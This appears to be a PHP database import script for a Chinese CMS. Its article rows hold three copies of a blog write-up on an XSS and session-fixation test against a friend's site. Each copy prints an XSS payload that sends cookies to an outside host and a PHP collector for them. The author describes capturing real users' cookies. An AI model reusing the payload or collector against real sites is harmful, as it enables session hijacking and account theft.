s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\\\\\\\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\\\\\\\\\"<?php \\\\$a=[];\\\\n\\\\\\\\\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\\\\\\\\\"\\\';\\\\n\\\\\\\\\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" onerror=\\\\\\\\\\\"console.log(\\\'xss\\\');\\\\\\\\\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](/$51/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](/$52/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](/$53/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](/$54/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](/$55/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](/$56/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](/$57/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](/$58/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](/$59/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](/$60/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](/$61/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
[测试代码](/$63/safe.zip)
>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为

>:notice: 注意标签
>>:warning: 警告
>>:info: 信息\',\'48\',\'4\',\'1476104456\',\'1476104456\',\'0\',\'0\',\'1\',\'1\',\'0\',\'b6c6d4ece915d3e12e974305b8ec142a\'),(\'59\',\'0\',\'0\',\'一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透，测试发布文档。文章zip的MD5不变则文章未改变\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](/$50/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" 
onerror=\\\\\\\\\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\\\\\\\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\\\\\\\\\"<?php \\\\$a=[];\\\\n\\\\\\\\\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\\\\\\\\\"\\\';\\\\n\\\\\\\\\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" onerror=\\\\\\\\\\\"console.log(\\\'xss\\\');\\\\\\\\\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](/$51/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](/$52/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](/$53/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](/$54/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](/$55/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](/$56/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](/$57/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](/$58/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](/$59/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](/$60/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](/$61/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
[测试代码](/$63/safe.zip)
>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为

>:notice: 注意标签
>>:warning: 警告
>>:info: 信息\',\'48\',\'5\',\'1476596003\',\'1476596003\',\'0\',\'0\',\'1\',\'1\',\'0\',\'e484abbf54887f4af5188189b3a952ce\'),(\'60\',\'0\',\'1\',\'一次不完整的XSS混合渗透测试记录\',\'测试发布文档 X2\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](/$50/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" 
onerror=\\\\\\\\\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\\\\\\\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\\\\\\\\\"<?php \\\\$a=[];\\\\n\\\\\\\\\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\\\\\\\\\"\\\';\\\\n\\\\\\\\\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\\\\\\\\\"\\\\\\\\\\\" onerror=\\\\\\\\\\\"console.log(\\\'xss\\\');\\\\\\\\\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](/$51/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](/$52/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](/$53/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](/$54/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](/$55/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](/$56/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](/$57/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](/$58/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](/$59/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](/$60/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](/$61/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
[测试代码](/$63/safe.zip)
>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为

>:notice: 注意标签
>>:warning: 警告
>>:info: 信息\',\'49\',\'10\',\'1476596149\',\'1476596149\',\'0\',\'0\',\'1\',\'1\',\'0\',\'c918a49489d6f14ae8416520ca9c68cb\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{bugs}'))->exec();

 (new Query('CREATE TABLE `#{bugs}` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user` varchar(80) NOT NULL,
  `discription` varchar(255) NOT NULL,
  `time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `status` tinyint(1) NOT NULL DEFAULT \'0\',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{bugs}` VALUES (\'1\',\'SixerMe\',\'用户名可使用空格\',\'2016-10-05 21:18:36\',\'1\'),(\'2\',\'_KaQqi\',\'特殊字符 UNICODE控制字符->RLO 导致出错\',\'2016-10-05 21:54:20\',\'0\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{category}'))->exec();

 (new Query('CREATE TABLE `#{category}` (
  `cid` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \'分类\',
  `icon` bigint(20) NOT NULL COMMENT \'分类图标\',
  `name` varchar(80) NOT NULL DEFAULT \'无分类\',
  `discription` tinytext NOT NULL,
  `counts` int(11) NOT NULL DEFAULT \'0\',
  `parent` int(11) NOT NULL DEFAULT \'0\',
  PRIMARY KEY (`cid`),
  KEY `cname` (`name`),
  KEY `parent` (`parent`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{category}` VALUES (\'1\',\'0\',\'无分类\',\'默认分类 Import\',\'0\',\'0\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{groups}'))->exec();

 (new Query('CREATE TABLE `#{groups}` (
  `gid` int(11) NOT NULL AUTO_INCREMENT,
  `sort` int(11) NOT NULL COMMENT \'分组排序\',
  `gname` varchar(80) NOT NULL,
  `E_Site` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'编辑站点\',
  `E_group` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'编辑分组\',
  `E_user` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'编辑用户\',
  `U_su` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'可以使用别人的名义\',
  `E_category` enum(\'Y\',\'N\') NOT NULL DEFAULT \'N\' COMMENT \'编辑分类\',
  PRIMARY KEY (`gid`),
  KEY `gname` (`gname`),
  KEY `priority` (`sort`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT=\'权限表\''))->exec();

 (new Query('INSERT INTO  `#{groups}` VALUES (\'1\',\'0\',\'网站所有者\',\'Y\',\'Y\',\'Y\',\'Y\',\'Y\'),(\'2\',\'1\',\'管理员\',\'Y\',\'Y\',\'Y\',\'N\',\'Y\'),(\'3\',\'2\',\'普通用户\',\'N\',\'N\',\'N\',\'N\',\'N\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{nav}'))->exec();

 (new Query('CREATE TABLE `#{nav}` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(24) NOT NULL,
  `url` tinytext NOT NULL,
  `title` varchar(255) NOT NULL,
  `show` tinyint(1) NOT NULL DEFAULT \'1\',
  `sort` int(11) NOT NULL DEFAULT \'0\',
  `parent` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id` (`id`),
  KEY `parent` (`parent`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{nav}` VALUES (\'1\',\'index\',\'/\',\'\',\'1\',\'1\',\'0\'),(\'2\',\'notes\',\'/notes\',\'\',\'1\',\'6\',\'0\'),(\'3\',\'article\',\'/article\',\'\',\'1\',\'2\',\'0\'),(\'4\',\'books\',\'/books\',\'\',\'1\',\'3\',\'0\'),(\'5\',\'question\',\'/question\',\'\',\'1\',\'4\',\'0\'),(\'7\',\'test\',\'/test\',\'OnlineJudge\',\'1\',\'5\',\'0\'),(\'9\',\'about\',\'/about\',\'\',\'1\',\'7\',\'0\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{signin_historys}'))->exec();

 (new Query('CREATE TABLE `#{signin_historys}` (
  `hid` bigint(20) NOT NULL AUTO_INCREMENT,
  `uid` bigint(20) NOT NULL,
  `ip` varchar(64) NOT NULL,
  `time` int(11) NOT NULL,
  PRIMARY KEY (`hid`),
  KEY `uid` (`uid`)
) ENGINE=InnoDB AUTO_INCREMENT=64 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{signin_historys}` VALUES (\'1\',\'43\',\'127.0.0.1\',\'1475722631\'),(\'2\',\'45\',\'127.0.0.1\',\'1475722691\'),(\'3\',\'46\',\'127.0.0.1\',\'1475722991\'),(\'4\',\'47\',\'127.0.0.1\',\'1475723206\'),(\'5\',\'43\',\'127.0.0.1\',\'1475725148\'),(\'6\',\'43\',\'127.0.0.1\',\'1475725860\'),(\'7\',\'43\',\'127.0.0.1\',\'1475725895\'),(\'8\',\'43\',\'127.0.0.1\',\'1475728023\'),(\'9\',\'43\',\'127.0.0.1\',\'1475883143\'),(\'10\',\'43\',\'127.0.0.1\',\'1475883549\'),(\'11\',\'43\',\'127.0.0.1\',\'1475883581\'),(\'12\',\'43\',\'127.0.0.1\',\'1475883661\'),(\'13\',\'43\',\'127.0.0.1\',\'1475883693\'),(\'14\',\'43\',\'127.0.0.1\',\'1475975525\'),(\'15\',\'43\',\'127.0.0.1\',\'1476087704\'),(\'16\',\'43\',\'127.0.0.1\',\'1476087817\'),(\'17\',\'43\',\'127.0.0.1\',\'1476088217\'),(\'18\',\'43\',\'127.0.0.1\',\'1476089722\'),(\'19\',\'43\',\'127.0.0.1\',\'1476089954\'),(\'20\',\'43\',\'127.0.0.1\',\'1476091087\'),(\'21\',\'43\',\'127.0.0.1\',\'1476091155\'),(\'22\',\'43\',\'127.0.0.1\',\'1476091230\'),(\'23\',\'43\',\'127.0.0.1\',\'1476091376\'),(\'24\',\'43\',\'127.0.0.1\',\'1476091514\'),(\'25\',\'43\',\'127.0.0.1\',\'1476091674\'),(\'26\',\'43\',\'127.0.0.1\',\'1476092362\'),(\'27\',\'43\',\'127.0.0.1\',\'1476092732\'),(\'28\',\'43\',\'127.0.0.1\',\'1476092889\'),(\'29\',\'43\',\'127.0.0.1\',\'1476093018\'),(\'30\',\'43\',\'127.0.0.1\',\'1476093451\'),(\'31\',\'43\',\'127.0.0.1\',\'1476093831\'),(\'32\',\'43\',\'127.0.0.1\',\'1476094097\'),(\'33\',\'43\',\'127.0.0.1\',\'1476098220\'),(\'34\',\'48\',\'127.0.0.1\',\'1476104456\'),(\'35\',\'43\',\'127.0.0.1\',\'1476112038\'),(\'36\',\'43\',\'127.0.0.1\',\'1476112144\'),(\'37\',\'48\',\'127.0.0.1\',\'1476183479\'),(\'38\',\'48\',\'127.0.0.1\',\'1476201705\'),(\'39\',\'43\',\'127.0.0.1\',\'1476201732\'),(\'40\',\'48\',\'127.0.0.1\',\'1476264619\'),(\'41\',\'48\',\'127.0.0.1\',\'1476266250\'),(\'42\',\'48\',\'127.0.0.1\',\'1476342253\'),(\'43\',\'48\',\'127.0.0.1\',\'1476342286\'),(\'44\',\'48\',\'127.0.0.1\',\'1476342325\'),(\'45\',\'48\',\'127.0.0.1\',\'1476342384\'),(\'46\',\'48\',\'127.0.0.1\',\'1476342426\'),(\'47\',\'48\',\'127.0.0.1\',\'1476342487\'),(\'48\',\'48\',\'127.0.0.1\',\'1476342512\'),(\'49\',\'48\',\'127.0.0.1\',\'1476342582\'),(\'50\',\'48\',\'127.0.0.1\',\'1476342656\'),(\'51\',\'48\',\'127.0.0.1\',\'1476342695\'),(\'52\',\'48\',\'127.0.0.1\',\'1476342715\'),(\'53\',\'48\',\'127.0.0.1\',\'1476342734\'),(\'54\',\'48\',\'127.0.0.1\',\'1476342760\'),(\'55\',\'48\',\'127.0.0.1\',\'1476342771\'),(\'56\',\'48\',\'127.0.0.1\',\'1476343515\'),(\'57\',\'48\',\'127.0.0.1\',\'1476343793\'),(\'58\',\'47\',\'127.0.0.1\',\'1476354661\'),(\'59\',\'49\',\'27.17.206.130\',\'1476584435\'),(\'60\',\'50\',\'220.202.153.35\',\'1476587388\'),(\'61\',\'48\',\'127.0.0.1\',\'1476595810\'),(\'62\',\'43\',\'113.246.217.148\',\'1476598122\'),(\'63\',\'46\',\'127.0.0.1\',\'1476609643\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{site_options}'))->exec();

 (new Query('CREATE TABLE `#{site_options}` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `value` text NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name_2` (`name`),
  KEY `name` (`name`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8 COMMENT=\'网站设置表\''))->exec();

 (new Query('INSERT INTO  `#{site_options}` VALUES (\'1\',\'site_name\',\'芒刺中国 -- 导入\'),(\'2\',\'theme\',\'default\'),(\'19\',\'site_logo\',\'/static/img/mccn.svg\'),(\'20\',\'keywords\',\'芒刺,程序员,文摘\'),(\'21\',\'lang\',\'zh_cn\'),(\'22\',\'HV_SignUp\',\'0\'),(\'23\',\'HV_SignIn\',\'0\'),(\'24\',\'HV_Post\',\'0\'),(\'25\',\'HV_Comment\',\'0\'),(\'26\',\'allowSignUp\',\'1\'),(\'27\',\'copyright\',\'芒刺中国\'),(\'28\',\'site_close\',\'0\'),(\'29\',\'close_info\',\'芒刺中国系统开发中\'),(\'30\',\'default_avatar\',\'39\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{tags}'))->exec();

 (new Query('CREATE TABLE `#{tags}` (
  `tid` int(11) NOT NULL AUTO_INCREMENT,
  `topic` int(11) NOT NULL,
  `name` varchar(80) NOT NULL,
  `count` int(11) NOT NULL,
  PRIMARY KEY (`tid`),
  UNIQUE KEY `name` (`name`),
  KEY `topic` (`topic`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{tags}` VALUES (\'1\',\'0\',\'C语言的标签,Import\',\'0\'),(\'2\',\'0\',\'安全\',\'8\'),(\'3\',\'0\',\'XSS\',\'9\'),(\'4\',\'0\',\'session fixation\',\'9\'),(\'5\',\'0\',\'Test\',\'3\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{upload_resource}'))->exec();

 (new Query('CREATE TABLE `#{upload_resource}` (
  `rid` bigint(20) NOT NULL AUTO_INCREMENT,
  `type` varchar(12) NOT NULL,
  `hash` varchar(32) NOT NULL,
  `reference` int(11) NOT NULL,
  PRIMARY KEY (`rid`),
  UNIQUE KEY `hash` (`hash`),
  KEY `type` (`type`)
) ENGINE=InnoDB AUTO_INCREMENT=1435 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{upload_resource}` VALUES (\'1\',\'php\',\'227266af399578b7ab7e235c4cd8100d\',\'2\'),(\'3\',\'ico\',\'d15c58b435dc1b1b305214dcf3db4fae\',\'4\'),(\'5\',\'htaccess\',\'234af24c938e881965fdd44c9992bf4b\',\'1\'),(\'8\',\'svg\',\'cebf20154625a03f5f9d5affdb7cba44\',\'2\'),(\'9\',\'gif\',\'386e75a697a151ab862b15b833a32924\',\'1\'),(\'11\',\'svg\',\'1803ddd82bef96900ac786ea0ea9aa4d\',\'1\'),(\'12\',\'svg\',\'adde1cc9e3fec089b92fb3d5e48c445e\',\'1\'),(\'13\',\'jpg\',\'080b9c6fd0b729fd46e48c807ceb9e80\',\'1\'),(\'14\',\'jpg\',\'94bfb9e39f398afac935295c961e9f50\',\'1\'),(\'15\',\'jpg\',\'ee147f88e2412f55b62ab55077643bf2\',\'1\'),(\'16\',\'png\',\'8829c3201b2dc871517deb735f1a1cfa\',\'1\'),(\'17\',\'png\',\'6cf74c100bf8eb8b78bc7991ae83b862\',\'1\'),(\'18\',\'png\',\'ff761cbfc7a765f282d245c4208922a8\',\'1\'),(\'19\',\'jpg\',\'8291c2a23be7df8509b078ef5198a27e\',\'1\'),(\'20\',\'png\',\'3a757192a5b09b29329bafb5f951fd9b\',\'103\'),(\'21\',\'png\',\'d6aed4f09440caa77fa042be65fcefaa\',\'103\'),(\'22\',\'png\',\'91b52e3f0ba22ae45efc1fb211651fe9\',\'103\'),(\'23\',\'png\',\'64dbb9dff94f30f69f661f6d0d29f4ac\',\'103\'),(\'24\',\'png\',\'cc1d137578dbf1634450cef7f071b599\',\'103\'),(\'25\',\'png\',\'d181ff5e0e6ff39884c921e985a86ba2\',\'103\'),(\'26\',\'png\',\'33c03df2857a78ca3678a3fa76136da3\',\'103\'),(\'27\',\'png\',\'15db4a6aa7515b6744adc99dad80ac4b\',\'103\'),(\'28\',\'png\',\'15a4d0b3d96031cc6dd027d5f9ba2640\',\'103\'),(\'29\',\'png\',\'dfc53b916f5e8bc52170631bb6d6cebf\',\'103\'),(\'30\',\'png\',\'c2e4e14f6b34b26fe155b1248b5a6b22\',\'103\'),(\'31\',\'png\',\'177ece4458907cdbd82e61f613c14e0a\',\'103\'),(\'141\',\'gif\',\'803bb46a6acef395ed9353de2dcf26f5\',\'81\'),(\'308\',\'zip\',\'1739fba963b40d7fda8ff3a906c20c03\',\'81\'),(\'1275\',\'png\',\'23d18c87dfd36cc4cb9bbc09a79dc768\',\'1\'),(\'1276\',\'png\',\'2840575f0be8057383443fe95110c0c4\',\'1\'),(\'1277\',\'jpg\',\'a4312f29adb5e8f312cec59422cb758d\',\'1\'),(\'1278\',\'zip\',\'2d064485b7385cb14a9d5257544c5a65\',\'4\'),(\'1282\',\'zip\',\'ac975122700b14fa4017368a088fa8bf\',\'5\'),(\'1378\',\'zip\',\'9bc736cd1f575c11de5b5b87fd5b2067\',\'1\'),(\'1392\',\'zip\',\'79d57136fa2b7689c1d3d1b9071d6ffe\',\'1\'),(\'1406\',\'zip\',\'e732770ab63ec15721bd1f413610fe2e\',\'1\'),(\'1420\',\'zip\',\'f2748339b57b5f206d15871e2f011e34\',\'1\'),(\'1434\',\'jpg\',\'f7ba682ab3e9bd2e244268293c5a99e6\',\'1\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{uploads}'))->exec();

 (new Query('CREATE TABLE `#{uploads}` (
  `rid` bigint(20) NOT NULL AUTO_INCREMENT,
  `owner` bigint(20) NOT NULL,
  `name` varchar(80) NOT NULL,
  `extension` varchar(16) NOT NULL,
  `time` int(11) NOT NULL,
  `resource` bigint(20) NOT NULL,
  `public` int(1) NOT NULL COMMENT \'是否公开\',
  PRIMARY KEY (`rid`),
  KEY `owner` (`owner`),
  KEY `public` (`public`),
  KEY `resource` (`resource`),
  KEY `extension` (`extension`)
) ENGINE=InnoDB AUTO_INCREMENT=74 DEFAULT CHARSET=utf8 COMMENT=\'上传资源表\''))->exec();

